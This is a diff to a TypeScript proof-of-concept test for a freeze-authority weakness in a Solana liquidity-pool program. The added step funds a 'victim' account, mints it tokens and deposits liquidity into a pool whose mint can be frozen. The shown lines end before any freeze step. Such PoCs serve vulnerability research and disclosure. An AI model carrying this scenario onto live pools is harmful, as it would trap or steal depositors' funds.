@@ -175,5 +175,117 @@ describe("freeze authority poc", () => {
     await client.processTransaction(createPoolTx);
 
     console.log("STEP 4 PASS: pool created with freeze-authority mint as one side:", poolState.toBase58());
+
+    // === STEP 5: victim deposits real liquidity into the pool ===
+    const victim = Keypair.generate();
+    const fundVictimTx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: payer.publicKey,
+        toPubkey: victim.publicKey,
+        lamports: 5_000_000_000,
+      })
+    );
+    const [bh6] = await client.getLatestBlockhash();
+    fundVictimTx.recentBlockhash = bh6;
+    fundVictimTx.feePayer = payer.publicKey;
+    fundVictimTx.sign(payer);
+    await client.processTransaction(fundVictimTx);
+    console.log("STEP 5a PASS: victim funded");
+
+    // Create victim's token accounts and mint them some of each token
+    const { createAssociatedTokenAccountInstruction, createMintToInstruction, getAssociatedTokenAddressSync } = await import("@solana/spl-token");
+
+    const victimAta0 = getAssociatedTokenAddressSync(tokenMint0, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
+    const victimAta1 = getAssociatedTokenAddressSync(tokenMint1, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
+
+    const setupVictimTokensTx = new Transaction().add(
+      createAssociatedTokenAccountInstruction(payer.publicKey, victimAta0, victim.publicKey, tokenMint0, TOKEN_2022_PROGRAM_ID),
+      createAssociatedTokenAccountInstruction(payer.publicKey, victimAta1, victim.publicKey, tokenMint1, TOKEN_2022_PROGRAM_ID),
+      createMintToInstruction(tokenMint0, victimAta0, payer.publicKey, 1_000_000_000, [], TOKEN_2022_PROGRAM_ID),
+      createMintToInstruction(tokenMint1, victimAta1, payer.publicKey, 1_000_000_000, [], TOKEN_2022_PROGRAM_ID)
+    );
+    const [bh7] = await client.getLatestBlockhash();
+    setupVictimTokensTx.recentBlockhash = bh7;
+    setupVictimTokensTx.feePayer = payer.publicKey;
+    setupVictimTokensTx.sign(payer);
+    await client.processTransaction(setupVictimTokensTx);
+    console.log("STEP 5b PASS: victim has real token balances in both mints");
+
+    // Open a position (this also initializes the tick arrays automatically)
+    const positionNftMint = Keypair.generate();
+    const tickLower = -600;
+    const tickUpper = 600;
+    const tickArrayLowerStart = -600;
+    const tickArrayUpperStart = 0;
+
+    const [protocolPosition] = PublicKey.findProgramAddressSync(
+      [
+        Buffer.from("position"),
+        poolState.toBuffer(),
+        Buffer.from(new anchor.BN(tickLower).toTwos(32).toArrayLike(Buffer, "be", 4)),
+        Buffer.from(new anchor.BN(tickUpper).toTwos(32).toArrayLike(Buffer, "be", 4)),
+      ],
+      program.programId
+    );
+    const [tickArrayLower] = PublicKey.findProgramAddressSync(
+      [Buffer.from("tick_array"), poolState.toBuffer(), Buffer.from(new anchor.BN(tickArrayLowerStart).toTwos(32).toArrayLike(Buffer, "be", 4))],
+      program.programId
+    );
+    const [tickArrayUpper] = PublicKey.findProgramAddressSync(
+      [Buffer.from("tick_array"), poolState.toBuffer(), Buffer.from(new anchor.BN(tickArrayUpperStart).toTwos(32).toArrayLike(Buffer, "be", 4))],
+      program.programId
+    );
+    const [personalPosition] = PublicKey.findProgramAddressSync(
+      [Buffer.from("position"), positionNftMint.publicKey.toBuffer()],
+      program.programId
+    );
+    const positionNftAccount = getAssociatedTokenAddressSync(positionNftMint.publicKey, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
+
+    const openPositionIx = await program.methods
+      .openPositionWithToken22Nft(
+        tickLower,
+        tickUpper,
+        tickArrayLowerStart,
+        tickArrayUpperStart,
+        new anchor.BN(1_000_000),
+        new anchor.BN(500_000_000),
+        new anchor.BN(500_000_000),
+        false,
+        null
+      )
+      .accounts({
+        payer: victim.publicKey,
+        positionNftOwner: victim.publicKey,
+        positionNftMint: positionNftMint.publicKey,
+        positionNftAccount: positionNftAccount,
+        poolState: poolState,
+        protocolPosition: protocolPosition,
+        tickArrayLower: tickArrayLower,
+        tickArrayUpper: tickArrayUpper,
+        personalPosition: personalPosition,
+        tokenAccount0: victimAta0,
+        tokenAccount1: victimAta1,
+        tokenVault0: tokenVault0,
+        tokenVault1: tokenVault1,
+        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
+        systemProgram: SystemProgram.programId,
+        tokenProgram: TOKEN_2022_PROGRAM_ID,
+        associatedTokenProgram: new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
+        tokenProgram2022: TOKEN_2022_PROGRAM_ID,
+        vault0Mint: tokenMint0,
+        vault1Mint: tokenMint1,
+      })
+      .instruction();
+
+    const openPositionTx = new Transaction().add(openPositionIx);
+    const [bh8] = await client.getLatestBlockhash();
+    openPositionTx.recentBlockhash = bh8;
+    openPositionTx.feePayer = victim.publicKey;
+    openPositionTx.sign(victim, positionNftMint);
+    await client.processTransaction(openPositionTx);
+
+    console.log("STEP 5c PASS: victim opened a real position and deposited real liquidity into the vaults");
+
+    
   });
 });
